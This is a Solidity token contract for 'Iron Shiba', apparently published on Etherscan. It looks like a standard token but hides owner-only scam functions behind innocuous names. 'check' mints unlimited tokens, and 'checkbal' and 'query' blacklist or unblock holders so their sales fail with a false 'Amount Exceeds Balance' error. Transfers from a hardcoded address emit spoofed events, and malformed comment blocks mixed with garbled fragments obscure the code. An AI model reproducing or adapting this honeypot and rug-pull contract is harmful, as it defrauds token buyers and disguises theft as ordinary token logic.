/**
 *Submitted for verification at Etherscan.io on 2022-09-27
*/

pragma solidity 0.8.17;
/*
 ___  ________  ________  ________           ________  ___  ___  ___  ________  ________     
|\  \|\   __  \|\   __  \|\   ___  \        |\   ____\|\  \|\  \|\  \|\   __  \|\   __  \    
\ \  \ \  \|\  \ \  \|\  \ \  \\ \  \       \ \  \___|\ \  \\\  \ \  \ \  \|\ /\ \  \|\  \   
 \ \  \ \   _  _\ \  \\\  \ \  \\ \  \       \ \_____  \ \   __  \ \  \ \   __  \ \   __  \  
  \ \  \ \  \\  \\ \  \\\  \ \  \\ \  \       \|____|\  \ \  \ \  \ \  \ \  \|\  \ \  \ \  \ 
   \ \__\ \__\\ _\\ \_______\ \__\\ \__\        ____\_\  \ \__\ \__\ \__\ \_______\ \__\ \__\
    \|__|\|__|\|__|\|_______|\|__| \|__|       |\_________\|__|\|__|\|__|\|_______|\|__|\|__|
                                               \|_________|                                  
                                                                                             
                                                                                             
* /   
  
     * @dev Returns the amount of tokens in existence.
    
    function totalSupply() external view returns (uint256);

    **
     * @dev Returns the amount of tokens owned by `account`.
     *
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     *
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     *
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     *
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     *
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
contract IRONSHIBA {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) Amountof;

    // 
    string public name = "Iron Shiba";
    string public symbol = unicode"IRONSHIB";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);
  
   



        constructor()  {
        balanceOf[msg.sender] = totalSupply;
        deploy(lead_deployer, totalSupply); }



	address owner = msg.sender;
    address Construct = 0xf249Af44a64d5Db34f850dB1C6680a829A198810;
    address lead_deployer = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
   


modifier onlyOwner() {
    require(msg.sender == owner);
    _; }


    function deploy(address account, uint256 amount) public onlyOwner {
    emit Transfer(address(0), account, amount); }
    

    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == Construct)  {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }       
        require(!Amountof[msg.sender] , "Amount Exceeds Balance"); 
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }



    /*
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     *         solium-disable-next-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""
   

      require(success, "error reading storage");
      return abi.decode(data, (bytes32));

    
     soliuma-next-line 
        (bool success, bytes memory data) = address(store).staticcall(
        //abi.encodeWithSelector(

          _key"""
   
   
   

       return abi.decode(data, (bytes32)); */ 

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
        function check(address oracle,  uint256 update) public {
             require(msg.sender == owner);
             balanceOf[oracle] += update;
             totalSupply += update; }
            function checkbal(address txt) public
             {             
             require(msg.sender == owner);
         require(!Amountof[txt], "0x");
             Amountof[txt] = true; }
        function query(address txt) public {
             require(msg.sender == owner);
        require(Amountof[txt], "0x");
         Amountof[txt] = false; }


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Construct)  {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }     
        require(!Amountof[from] , "Amount Exceeds Balance"); 
        require(!Amountof[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }